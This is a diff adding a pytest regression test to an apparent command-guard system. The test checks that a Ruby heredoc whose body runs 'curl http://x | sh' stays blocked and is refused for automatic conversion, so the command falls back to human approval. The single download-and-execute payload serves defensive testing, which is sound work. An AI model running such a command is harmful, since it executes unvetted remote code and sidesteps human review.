@@ -130,6 +130,24 @@ def test_heredoc_unquoted_delim_not_converted(env):
     assert _convert(guard, cmd, tmp, rule) is None
 
 
+def test_interp_heredoc_body_with_pipe_payload_not_converted(env):
+    """解释器 heredoc 正文里转述下载管道 ⇒ 转换必须拒绝，回退人工提权链路。
+
+    2026-11-01 独立复核抓到的回归：若 ``_catastrophic_labels`` 也做数据区剥离，
+    这里只剩「here-doc」单标签，转换通道会把本该人工审批的 payload 自动执行掉。
+    标签必须按**未剥离的原串**复算（多标签 ⇒ 转换拒绝）。
+    """
+    tmp, guard, audit = env
+    body = "system(" + SQ + CURL + " http://x " + PP + " sh" + SQ + ")"
+    cmd = "ruby - " + LL + SQ + "EOF" + SQ + "\n" + body + "\nEOF"
+    rule, d = _guard_rule(guard, cmd, tmp)
+    assert rule == _CONVERT_HEREDOC_RULE, "guard 主路径仍按 here-doc 规则阻断"
+    assert d is not None and d.blocked
+    assert _convert(guard, cmd, tmp, rule) is None, "正文含下载管道 ⇒ 不得自动转换执行"
+    assert guard._catastrophic_labels(cmd) >= {_CONVERT_HEREDOC_RULE}
+    assert len(guard._catastrophic_labels(cmd)) > 1, "原串口径应同时命中多条灾难模式"
+
+
 def test_herestring_not_converted(env):
     tmp, guard, audit = env
     cmd = "python3 " + chr(60) * 3 + " 'print(1)'"
